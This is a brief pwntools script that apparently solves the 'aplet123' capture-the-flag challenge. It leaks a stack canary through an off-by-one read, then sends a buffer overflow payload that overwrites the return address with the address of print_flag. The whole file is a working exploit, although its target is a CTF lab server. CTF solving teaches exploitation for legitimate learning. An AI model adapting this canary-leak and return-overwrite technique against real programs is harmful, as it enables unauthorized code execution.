from pwn import *

context.log_level = 'warn'
context.terminal = ['tmux', 'splitw', '-v']

target = './aplet123'
target_elf = ELF(target)

io = remote('chall.lac.tf', 31123)

io.sendline(cyclic(69)+b"i'm")
io.recvuntil(b"hi ")
canary = io.recv(7)

io.recvrepeat(1)
io.sendline(cyclic(72) + b'\0' + canary + p64(0xdeadbeefdeadbeef) + p64(target_elf.symbols['print_flag']))
io.sendline(b'bye')
print(io.recvrepeat(1).decode().splitlines()[2])
